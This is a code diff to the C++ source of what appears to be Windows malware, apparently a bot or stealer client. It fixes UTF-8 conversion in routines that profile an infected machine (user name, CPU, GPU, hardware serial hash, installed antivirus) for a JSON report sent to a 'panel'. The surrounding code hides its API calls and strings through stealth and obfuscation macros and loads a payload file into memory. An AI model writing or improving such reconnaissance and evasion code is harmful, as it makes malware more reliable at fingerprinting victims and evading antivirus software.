@@ -42,6 +42,142 @@ typedef BOOL(WINAPI* pGetExitCodeProcess_t)(HANDLE, LPDWORD);
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "oleaut32.lib")
 
+// --- Encoding helpers -------------------------------------------------------
+namespace {
+
+// Decodes a single UTF-8 sequence starting at index `i`.
+// Returns the sequence length (1-4), or 0 when the bytes are not a valid
+// UTF-8 sequence (bad lead byte, truncated sequence, overlong form, surrogate
+// or out-of-range code point).
+size_t DecodeUtf8Sequence(const std::string& str, size_t i, unsigned int& codepoint) {
+    static const unsigned int kMinCodepoint[5] = { 0, 0, 0x80, 0x800, 0x10000 };
+
+    const unsigned char c = static_cast<unsigned char>(str[i]);
+    size_t length;
+    unsigned int cp;
+
+    if (c < 0x80)                 { length = 1; cp = c; }
+    else if ((c & 0xE0) == 0xC0)  { length = 2; cp = c & 0x1Fu; }
+    else if ((c & 0xF0) == 0xE0)  { length = 3; cp = c & 0x0Fu; }
+    else if ((c & 0xF8) == 0xF0)  { length = 4; cp = c & 0x07u; }
+    else                          { return 0; }
+
+    if (i + length > str.size()) return 0;
+
+    for (size_t k = 1; k < length; ++k) {
+        const unsigned char cc = static_cast<unsigned char>(str[i + k]);
+        if ((cc & 0xC0) != 0x80) return 0;
+        cp = (cp << 6) | (cc & 0x3Fu);
+    }
+
+    if (cp < kMinCodepoint[length] || cp > 0x10FFFF || (cp >= 0xD800 && cp <= 0xDFFF))
+        return 0;
+
+    codepoint = cp;
+    return length;
+}
+
+} // namespace
+
+std::wstring Utf8ToWide(const std::string& str) {
+    if (str.empty()) return std::wstring();
+
+    int sizeNeeded = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), static_cast<int>(str.size()), NULL, 0);
+    if (sizeNeeded <= 0) return std::wstring();
+
+    std::wstring result(static_cast<size_t>(sizeNeeded), L'\0');
+    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), static_cast<int>(str.size()), &result[0], sizeNeeded);
+    return result;
+}
+
+std::string WideToUTF8(const wchar_t* wstr, int len) {
+    if (wstr == NULL) return std::string();
+
+    if (len < 0) {
+        len = static_cast<int>(wcslen(wstr));
+    }
+    if (len <= 0) return std::string();
+
+    // WideCharToMultiByte with UTF-8 replaces unpaired surrogates, so the output
+    // is always a valid UTF-8 sequence.
+    int sizeNeeded = WideCharToMultiByte(CP_UTF8, 0, wstr, len, NULL, 0, NULL, NULL);
+    if (sizeNeeded <= 0) return std::string();
+
+    std::string result(static_cast<size_t>(sizeNeeded), '\0');
+    WideCharToMultiByte(CP_UTF8, 0, wstr, len, &result[0], sizeNeeded, NULL, NULL);
+    return result;
+}
+
+std::string WideToUTF8(const std::wstring& wstr) {
+    return WideToUTF8(wstr.c_str(), static_cast<int>(wstr.size()));
+}
+
+std::string AnsiToUTF8(const char* str, int len) {
+    if (str == NULL) return std::string();
+
+    if (len < 0) {
+        len = static_cast<int>(strlen(str));
+    }
+    if (len <= 0) return std::string();
+
+    // Interprets the bytes using the system ANSI code page and re-encodes them
+    // as UTF-8, so accented/non-Latin text survives instead of being mangled.
+    int wideLen = MultiByteToWideChar(CP_ACP, 0, str, len, NULL, 0);
+    if (wideLen <= 0) return std::string();
+
+    std::wstring wide(static_cast<size_t>(wideLen), L'\0');
+    MultiByteToWideChar(CP_ACP, 0, str, len, &wide[0], wideLen);
+    return WideToUTF8(wide);
+}
+
+bool IsValidUTF8(const std::string& str) {
+    size_t i = 0;
+    while (i < str.size()) {
+        unsigned int codepoint = 0;
+        const size_t length = DecodeUtf8Sequence(str, i, codepoint);
+        if (length == 0) return false;
+        i += length;
+    }
+    return true;
+}
+
+std::string EnsureValidUTF8(const std::string& str) {
+    // Fast path: already well formed, nothing to do.
+    if (IsValidUTF8(str)) return str;
+
+    // Last line of defence before the value reaches nlohmann::json, which throws
+    // type_error.316 on invalid UTF-8 and would abort the whole report. Every
+    // offending byte is replaced with U+FFFD (REPLACEMENT CHARACTER).
+    static const char kReplacement[] = "\xEF\xBF\xBD";
+
+    std::string result;
+    result.reserve(str.size());
+
+    size_t i = 0;
+    while (i < str.size()) {
+        unsigned int codepoint = 0;
+        const size_t length = DecodeUtf8Sequence(str, i, codepoint);
+        if (length == 0) {
+            result += kReplacement;
+            ++i;
+            continue;
+        }
+        result.append(str, i, length);
+        i += length;
+    }
+    return result;
+}
+
+std::string TrimWhitespace(const std::string& str) {
+    const char* kWhitespace = " \t\r\n\v\f";
+
+    size_t start = str.find_first_not_of(kWhitespace);
+    if (start == std::string::npos) return std::string();
+
+    size_t end = str.find_last_not_of(kWhitespace);
+    return str.substr(start, end - start + 1);
+}
+
 
 BYTE *buffer_payload(wchar_t *filename, OUT size_t &r_size)
 {
@@ -70,9 +206,14 @@ BYTE *buffer_payload(wchar_t *filename, OUT size_t &r_size)
         return nullptr;
     }
     r_size = GetFileSize(file, 0);
-    BYTE* localCopyAddress = (BYTE*) VirtualAlloc(NULL, r_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    BYTE* localCopyAddress = allocate_buffer(r_size);
     if (localCopyAddress == NULL) {
         std::cerr << "Could not allocate memory in the current process" << std::endl;
+        // Release the view and both handles, otherwise every failed load leaked
+        // the mapping and the file handle.
+        UnmapViewOfFile(dllRawData);
+        CloseHandle(mapping);
+        CloseHandle(file);
         return nullptr;
     }
     memcpy(localCopyAddress, dllRawData, r_size);
@@ -82,10 +223,23 @@ BYTE *buffer_payload(wchar_t *filename, OUT size_t &r_size)
     return localCopyAddress;
 }
 
+BYTE* allocate_buffer(size_t size)
+{
+    if (size == 0) return nullptr;
+    return (BYTE*)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+}
+
 void free_buffer(BYTE* buffer)
 {
     if (buffer == NULL) return;
-    VirtualFree(buffer, 0, MEM_RELEASE);
+    if (!VirtualFree(buffer, 0, MEM_RELEASE)) {
+        // Reaching this means the buffer did not come from allocate_buffer()/
+        // VirtualAlloc() and was therefore never released.
+#ifdef ENABLE_DEBUG_CONSOLE
+        std::cerr << "[-] free_buffer: VirtualFree failed (error " << GetLastError()
+                  << "), buffer was not allocated with allocate_buffer()" << std::endl;
+#endif
+    }
 }
 
 wchar_t* get_file_name(wchar_t *full_path)
@@ -101,18 +255,35 @@ wchar_t* get_file_name(wchar_t *full_path)
 
 
 std::string GetWindowsUsername() {
-    pGetUserNameA_util_t _GetUserNameA = (pGetUserNameA_util_t)STEALTH_API_OBFSTR("advapi32.dll", "GetUserNameA");
+    typedef BOOL(WINAPI* pGetUserNameW_util_t)(LPWSTR, LPDWORD);
+    pGetUserNameW_util_t _GetUserNameW = (pGetUserNameW_util_t)STEALTH_API_OBFSTR("advapi32.dll", "GetUserNameW");
+
     const DWORD MAX_USERNAME_LENGTH = 256;
-    char username[MAX_USERNAME_LENGTH];
+    std::string result;
     DWORD size = MAX_USERNAME_LENGTH;
 
-    if (!_GetUserNameA || !_GetUserNameA(username, &size)) {
-        return OBFUSCATE_STRING("guest");
+    // Prefer the Unicode API: GetUserNameA() converts to the ANSI code page, so
+    // an accented user name became invalid UTF-8 and broke the JSON report.
+    if (_GetUserNameW) {
+        wchar_t usernameW[MAX_USERNAME_LENGTH] = { 0 };
+        if (_GetUserNameW(usernameW, &size) && size > 1) {
+            result = WideToUTF8(usernameW, static_cast<int>(size - 1));
+        }
     }
 
-    std::string result(username, size - 1);
+    if (result.empty()) {
+        pGetUserNameA_util_t _GetUserNameA = (pGetUserNameA_util_t)STEALTH_API_OBFSTR("advapi32.dll", "GetUserNameA");
+        char usernameA[MAX_USERNAME_LENGTH] = { 0 };
+        size = MAX_USERNAME_LENGTH;
+
+        if (!_GetUserNameA || !_GetUserNameA(usernameA, &size) || size <= 1) {
+            return OBFUSCATE_STRING("guest");
+        }
+        result = AnsiToUTF8(usernameA, static_cast<int>(size - 1));
+    }
+
     std::replace(result.begin(), result.end(), ' ', '-');
-    return result;
+    return EnsureValidUTF8(result);
 }
 
 int GetSystemUptimeMinutes() {
@@ -280,47 +451,73 @@ bool IsAnotherInstanceRunning(const char* mutexName) {
 }
 
 std::string GetCPUName() {
-    // Use RegistryAPI for stealth registry access
+    const std::string keyPathA = OBFUSCATE_STRING("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0");
+    const std::string valueNameA = OBFUSCATE_STRING("ProcessorNameString");
+    const std::wstring keyPathW = Utf8ToWide(keyPathA);
+    const std::wstring valueNameW = Utf8ToWide(valueNameA);
+
+    // Preferred path: read the REG_SZ as UTF-16 and convert to UTF-8 directly.
+    // The A variants would map the string through the ANSI code page instead.
+    pRegOpenKeyExW_t _RegOpenKeyExW = (pRegOpenKeyExW_t)STEALTH_API_OBFSTR("advapi32.dll", "RegOpenKeyExW");
+    pRegQueryValueExW_t _RegQueryValueExW = (pRegQueryValueExW_t)STEALTH_API_OBFSTR("advapi32.dll", "RegQueryValueExW");
+    pRegCloseKey_util_t _RegCloseKey = (pRegCloseKey_util_t)STEALTH_API_OBFSTR("advapi32.dll", "RegCloseKey");
+
+    if (_RegOpenKeyExW && _RegQueryValueExW && _RegCloseKey) {
+        HKEY hKey = NULL;
+        if (_RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPathW.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+            wchar_t cpuNameW[256] = { 0 };
+            DWORD size = sizeof(cpuNameW);
+            LONG result = _RegQueryValueExW(hKey, valueNameW.c_str(), NULL, NULL, (LPBYTE)cpuNameW, &size);
+            _RegCloseKey(hKey);
+
+            if (result == ERROR_SUCCESS) {
+                std::string cpuName = TrimWhitespace(WideToUTF8(cpuNameW));
+                if (!cpuName.empty()) {
+                    return EnsureValidUTF8(cpuName);
+                }
+            }
+        }
+    }
+
+    // Fallback: ANSI registry access through the stealth RegistryAPI. The bytes
+    // are decoded with the ANSI code page and re-encoded as UTF-8 so they stay
+    // usable for the panel payload.
     RegistryAPI regAPI;
-    if (!regAPI.IsInitialized()) {
-        // Fallback to direct registry API
-        HKEY hKey;
-        LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
-            OBFUSCATE_STRING("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0").c_str(), 
-            0, KEY_READ, &hKey);
-        
-        if (result != ERROR_SUCCESS) {
+    if (regAPI.IsInitialized()) {
+        HKEY hKey = NULL;
+        if (regAPI.pRegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPathA.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
             return OBFUSCATE_STRING("Unknown");
         }
 
-        char cpuName[256] = {0};
-        DWORD size = sizeof(cpuName);
-        result = RegQueryValueExA(hKey, OBFUSCATE_STRING("ProcessorNameString").c_str(), NULL, NULL, (LPBYTE)cpuName, &size);
-        RegCloseKey(hKey);
+        char cpuNameA[256] = { 0 };
+        DWORD size = sizeof(cpuNameA);
+        LONG result = regAPI.pRegQueryValueExA(hKey, valueNameA.c_str(), NULL, NULL, (LPBYTE)cpuNameA, &size);
+        regAPI.pRegCloseKey(hKey);
 
         if (result == ERROR_SUCCESS) {
-            return std::string(cpuName);
+            std::string cpuName = TrimWhitespace(AnsiToUTF8(cpuNameA));
+            if (!cpuName.empty()) {
+                return EnsureValidUTF8(cpuName);
+            }
         }
         return OBFUSCATE_STRING("Unknown");
     }
 
-    char cpuName[256] = {0};
-    DWORD size = sizeof(cpuName);
-    
     HKEY hKey = NULL;
-    LONG result = regAPI.pRegOpenKeyExA(HKEY_LOCAL_MACHINE, 
-        OBFUSCATE_STRING("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0").c_str(), 
-        0, KEY_READ, &hKey);
-    
-    if (result != ERROR_SUCCESS) {
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPathA.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
         return OBFUSCATE_STRING("Unknown");
     }
 
-    result = regAPI.pRegQueryValueExA(hKey, OBFUSCATE_STRING("ProcessorNameString").c_str(), NULL, NULL, (LPBYTE)cpuName, &size);
-    regAPI.pRegCloseKey(hKey);
+    char cpuNameA[256] = { 0 };
+    DWORD size = sizeof(cpuNameA);
+    LONG result = RegQueryValueExA(hKey, valueNameA.c_str(), NULL, NULL, (LPBYTE)cpuNameA, &size);
+    RegCloseKey(hKey);
 
     if (result == ERROR_SUCCESS) {
-        return std::string(cpuName);
+        std::string cpuName = TrimWhitespace(AnsiToUTF8(cpuNameA));
+        if (!cpuName.empty()) {
+            return EnsureValidUTF8(cpuName);
+        }
     }
     return OBFUSCATE_STRING("Unknown");
 }
@@ -386,32 +583,17 @@ std::string GetGPUName() {
             
             HRESULT hresGet = pclsObj->Get(L"Name", 0, &vtProp, 0, 0);
             if (SUCCEEDED(hresGet) && vtProp.vt == VT_BSTR && vtProp.bstrVal != NULL) {
-                // Successfully got the Name property
-                size_t len = wcslen(vtProp.bstrVal) + 1;
-                char* gpuNameA = new char[len];
-                
-                if (wcstombs_s(nullptr, gpuNameA, len, vtProp.bstrVal, _TRUNCATE) == 0) {
-                    gpuName = std::string(gpuNameA);
-                    
-                    // Trim whitespace
-                    size_t start = gpuName.find_first_not_of(" \t\r\n");
-                    if (start != std::string::npos) {
-                        gpuName = gpuName.substr(start);
-                    }
-                    size_t end = gpuName.find_last_not_of(" \t\r\n");
-                    if (end != std::string::npos) {
-                        gpuName = gpuName.substr(0, end + 1);
-                    }
-                    
-                    // If we got a valid name, break and return it
-                    if (!gpuName.empty() && gpuName != "Unknown") {
-                        delete[] gpuNameA;
-                        VariantClear(&vtProp);
-                        pclsObj->Release();
-                        break;
-                    }
+                // The BSTR is UTF-16. Convert it straight to UTF-8: wcstombs_s used
+                // the ANSI code page (mangling non-ASCII names) and the old
+                // "new char[wcslen + 1]" buffer was too small for multi-byte output.
+                std::string candidate = TrimWhitespace(WideToUTF8(vtProp.bstrVal));
+
+                if (!candidate.empty() && candidate != "Unknown") {
+                    gpuName = candidate;
+                    VariantClear(&vtProp);
+                    pclsObj->Release();
+                    break;
                 }
-                delete[] gpuNameA;
             }
             
             VariantClear(&vtProp);
@@ -423,7 +605,7 @@ std::string GetGPUName() {
             pSvc->Release();
             pLoc->Release();
             CoUninitialize();
-            return gpuName;
+            return EnsureValidUTF8(gpuName);
         }
 
         pEnumerator->Release();
@@ -471,16 +653,11 @@ registry_fallback:
                         wchar_t* deviceName = deviceDesc;
                         wchar_t* semicolon = wcschr(deviceDesc, L';');
                         if (semicolon != NULL) deviceName = semicolon + 1;
-                        char gpuNameA[512];
-                        wcstombs_s(nullptr, gpuNameA, sizeof(gpuNameA), deviceName, _TRUNCATE);
-                        gpuName = std::string(gpuNameA);
-                        size_t start = gpuName.find_first_not_of(" \t");
-                        if (start != std::string::npos) gpuName = gpuName.substr(start);
-                        size_t end = gpuName.find_last_not_of(" \t");
-                        if (end != std::string::npos) gpuName = gpuName.substr(0, end + 1);
+                        // Stay in Unicode all the way to UTF-8 (no ANSI detour).
+                        gpuName = TrimWhitespace(WideToUTF8(deviceName));
                         _RegCloseKey(hSubKey);
                         _RegCloseKey(hKey);
-                        return gpuName;
+                        return EnsureValidUTF8(gpuName);
                     }
                 }
             }
@@ -490,7 +667,7 @@ registry_fallback:
         subkeyNameSize = sizeof(subkeyName) / sizeof(wchar_t);
     }
     _RegCloseKey(hKey);
-    return gpuName;
+    return EnsureValidUTF8(gpuName);
     }
 }
 
@@ -534,14 +711,8 @@ std::string GetComputerHash() {
                     VariantInit(&vtProp);
                     if (SUCCEEDED(pObj->Get(L"SerialNumber", 0, &vtProp, 0, 0)) &&
                         vtProp.vt == VT_BSTR && vtProp.bstrVal != NULL) {
-                        int len = WideCharToMultiByte(CP_UTF8, 0, vtProp.bstrVal, -1,
-                            NULL, 0, NULL, NULL);
-                        if (len > 1) {
-                            std::string s(len - 1, '\0');
-                            WideCharToMultiByte(CP_UTF8, 0, vtProp.bstrVal, -1,
-                                &s[0], len, NULL, NULL);
-                            mbSerial = s;
-                        }
+                        mbSerial = EnsureValidUTF8(WideToUTF8(vtProp.bstrVal));
+                        if (mbSerial.empty()) mbSerial = "0";
                     }
                     VariantClear(&vtProp);
                     pObj->Release();
@@ -569,48 +740,46 @@ std::string GetComputerHash() {
 }
 
 std::string GetAntivirusName() {
-    pRegOpenKeyExA_util_t _RegOpenKeyExA = (pRegOpenKeyExA_util_t)STEALTH_API_OBFSTR("advapi32.dll", "RegOpenKeyExA");
+    // Enumerate the Uninstall key with the Unicode APIs: RegEnumKeyExA() maps
+    // subkey names through the ANSI code page, which fails or mangles them on
+    // non-English systems.
+    pRegOpenKeyExW_t _RegOpenKeyExW = (pRegOpenKeyExW_t)STEALTH_API_OBFSTR("advapi32.dll", "RegOpenKeyExW");
     pRegCloseKey_util_t _RegCloseKey = (pRegCloseKey_util_t)STEALTH_API_OBFSTR("advapi32.dll", "RegCloseKey");
-    pRegEnumKeyExA_t _RegEnumKeyExA = (pRegEnumKeyExA_t)STEALTH_API_OBFSTR("advapi32.dll", "RegEnumKeyExA");
-    if (!_RegOpenKeyExA || !_RegCloseKey || !_RegEnumKeyExA)
+    pRegEnumKeyExW_t _RegEnumKeyExW = (pRegEnumKeyExW_t)STEALTH_API_OBFSTR("advapi32.dll", "RegEnumKeyExW");
+    if (!_RegOpenKeyExW || !_RegCloseKey || !_RegEnumKeyExW)
         return OBFUSCATE_STRING("Unknown");
 
-    HKEY hKey;
-    LONG result = _RegOpenKeyExA(HKEY_LOCAL_MACHINE,
-        OBFUSCATE_STRING("SOFTWARE\\Microsoft\\Windows Defender").c_str(),
-        0, KEY_READ, &hKey);
-
-    if (result == ERROR_SUCCESS) {
+    HKEY hKey = NULL;
+    const std::wstring defenderKey = Utf8ToWide(OBFUSCATE_STRING("SOFTWARE\\Microsoft\\Windows Defender"));
+    if (_RegOpenKeyExW(HKEY_LOCAL_MACHINE, defenderKey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
         _RegCloseKey(hKey);
         return OBFUSCATE_STRING("Windows Defender");
     }
 
-    result = _RegOpenKeyExA(HKEY_LOCAL_MACHINE,
-        OBFUSCATE_STRING("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall").c_str(),
-        0, KEY_READ, &hKey);
+    const std::wstring uninstallKey = Utf8ToWide(OBFUSCATE_STRING("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"));
+    if (_RegOpenKeyExW(HKEY_LOCAL_MACHINE, uninstallKey.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS)
+        return OBFUSCATE_STRING("Unknown");
 
-    if (result == ERROR_SUCCESS) {
-        const char* antivirusNames[] = {
-            "Norton", "McAfee", "Kaspersky", "AVG", "Avast",
-            "Bitdefender", "F-Secure", "ESET", "Trend Micro", "Symantec"
-        };
+    const wchar_t* antivirusNames[] = {
+        L"Norton", L"McAfee", L"Kaspersky", L"AVG", L"Avast",
+        L"Bitdefender", L"F-Secure", L"ESET", L"Trend Micro", L"Symantec"
+    };
 
-        DWORD index = 0;
-        char subkeyName[256];
-        DWORD subkeyNameSize = sizeof(subkeyName);
+    DWORD index = 0;
+    wchar_t subkeyName[256] = { 0 };
+    DWORD subkeyNameSize = sizeof(subkeyName) / sizeof(wchar_t);
 
-        while (_RegEnumKeyExA(hKey, index, subkeyName, &subkeyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
-            for (const char* av : antivirusNames) {
-                if (strstr(subkeyName, av) != nullptr) {
-                    _RegCloseKey(hKey);
-                    return std::string(av);
-                }
+    while (_RegEnumKeyExW(hKey, index, subkeyName, &subkeyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
+        for (const wchar_t* av : antivirusNames) {
+            if (wcsstr(subkeyName, av) != nullptr) {
+                _RegCloseKey(hKey);
+                return EnsureValidUTF8(WideToUTF8(av));
             }
-            index++;
-            subkeyNameSize = sizeof(subkeyName);
         }
-        _RegCloseKey(hKey);
+        index++;
+        subkeyNameSize = sizeof(subkeyName) / sizeof(wchar_t);
     }
+    _RegCloseKey(hKey);
 
     return OBFUSCATE_STRING("Unknown");
 }
